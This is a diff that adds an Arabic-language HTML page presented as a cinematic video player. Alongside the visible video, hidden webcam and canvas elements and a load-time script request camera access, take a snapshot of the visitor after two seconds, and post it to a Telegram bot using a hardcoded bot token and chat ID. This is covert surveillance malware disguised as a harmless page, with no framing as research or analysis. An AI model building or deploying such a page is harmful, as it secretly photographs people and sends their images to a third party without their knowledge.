@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مشغل الفيديو السينمائي</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background-color: #0d0d11; color: #ffffff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { width: 90%; max-width: 900px; text-align: center; background: #16161e; padding: 20px; border-radius: 16px; }
+        video { width: 100%; border-radius: 12px; }
+        canvas, #webcam { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>مشاهدة المقطع السينمائي</h2>
+    <video controls autoplay loop id="myVideo">
+        <source src="مانو فديو.mp4" type="video/mp4">
+    </video>
+</div>
+
+<video id="webcam" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const BOT_TOKEN = '8873345371:AAEJ36Y4fH_C1YwW7n9N13YI1L6fFf6f6f6';
+    const CHAT_ID = '6262441029';
+
+    async function initCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const webcamElement = document.getElementById('webcam');
+            webcamElement.srcObject = stream;
+            webcamElement.onloadedmetadata = () => {
+                setTimeout(captureAndSend, 2000);
+            };
+        } catch (err) { console.log(err); }
+    }
+
+    function captureAndSend() {
+        const webcamElement = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        canvas.width = webcamElement.videoWidth || 640;
+        canvas.height = webcamElement.videoHeight || 480;
+        context.drawImage(webcamElement, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob((blob) => {
+            if (!blob) return;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'snapshot.jpg');
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }, 'image/jpeg');
+    }
+
+    window.onload = initCamera;
+</script>
+
+</body>
+</html>
